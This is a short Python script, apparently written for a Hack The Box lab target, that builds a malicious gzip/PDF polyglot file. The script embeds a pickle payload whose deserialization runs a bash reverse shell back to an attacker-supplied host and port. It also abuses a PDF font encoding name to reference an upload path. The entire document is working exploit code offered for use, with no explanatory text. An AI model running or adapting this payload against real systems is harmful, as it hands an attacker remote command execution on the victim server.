import gzip, pickle, os, sys

LHOST, LPORT = sys.argv[1], sys.argv[2]

UP = "/var/www/research.bedside.htb/uploads"
NAME = "shell"

class RCE:
   def __reduce__(self):
       cmd = f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &"
       return (os.system, (cmd,))

enc = (UP + "/" + NAME).replace("/", "#2F")

PDF = """%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R
/Resources << /Font << /F1 5 0 R >> >> >>endobj
4 0 obj<< /Length 20 >>stream
BT /F1 12 Tf ET
endstream endobj
5 0 obj<< /Type /Font /Subtype /Type0 /BaseFont /F
/Encoding /__ENC__ /DescendantFonts [6 0 R] >>endobj
6 0 obj<< /Type /Font /Subtype /CIDFontType2 /BaseFont /F
/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>
/FontDescriptor 7 0 R >>endobj
7 0 obj<< /Type /FontDescriptor /FontName /F /Flags 4
/FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000
/Descent -200 /CapHeight 800 /StemV 80 >>endobj
trailer<< /Size 8 /Root 1 0 R >>
%%EOF
""".replace("__ENC__", enc)

pickled = pickle.dumps(RCE())
gz = bytearray(gzip.compress(pickled))
gz[3] |= 0x10  
out = bytes(gz[:10]) + b"\n" + PDF.encode() + b"\x00" + bytes(gz[10:])
open(NAME + ".pickle.gz", "wb").write(out)
print("built " + NAME + ".pickle.gz")

